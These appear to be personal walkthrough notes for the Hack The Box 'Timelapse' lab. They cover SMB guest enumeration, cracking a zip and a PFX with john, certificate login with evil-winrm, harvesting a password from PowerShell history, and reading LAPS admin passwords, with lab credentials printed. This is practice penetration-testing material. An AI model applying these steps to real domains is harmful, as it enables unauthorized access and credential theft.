smb enum for guest shows the share "shares" is readable
we also gather usernames using nxc rid
"Shares" share has a winrm.zip, which is password proteted
`zip2john` and crack, gives us the password "supremelegacy"
upon unzipping, we see a legacy_dev_auth.pfx file
`strings legacy_dev_auth.pfx` shows it is for the user legacyy amd password is possibly Legacyy0
tried a few things, but the way forward is to crack the pfx using john
`pfx2john legacy_dev__auth.pfx` and crack the hash with john, to get the password "thuglegacy"

Now, we need to extract private key and certificate from the pfx file
```zsh
openssl pkcs12 -in legacy_dev_auth.pfx -nocerts -out privkey.pem -nodes
#enter the password, gives privkey.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
#enter the password to get cert.pem
```
Now, we can log into legacy, using evil-wirm
But to be able to login, we hadnt noticed any winrm ports listening.
`sudo nmap 10.129.227.113 -sC -sV -p5985-5986`
we find 5985 is filtered, and 5986 (wmanS) is open. This means, we need to use the -S flag with evil-winrm, so that we login to port 5986
`evil-winrm -i 10.129.227.113 -c cert.pem -k privkey.pem -S`

---
we get user.txt there, we upload and run winpeas
It shows there's a powershell history file at `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, we open it to find password for svc_deploy 'E3R$Q62^12p7PLlC%KWaxuaV'

---
`evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S`

on logging in, we find we are member of the group "LAPS readers"
Usually, if we are a member of that group, we can go to `cd c:\Program Files\laps\cse` and find a AdmPwd.dll file, `Get-AdmPwdPassword -ComputerName <computerName>` -- to view the password of local admin of the computer name, basically following the 
[[Credential Harvesting - AD]] LAPS motes.
However, that wasnt working
So, ippsec's walkthrough showed usage of Get-ADComputer
`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *`
OR
`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property ms-Mcs-AdmPwd` -- to get a little shorter output

Look for AdmPwd (using ctrl+shift+F), and that's the password for the administrator on the box
`net user` to cinfirm if they have changed the name of the administrator
Now, evil-winrm or psexec as the administrator, with the discovered password 
`GhL#v/g)[xv5F42;U&qn8Vb+`
OR
`python laps.py -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'`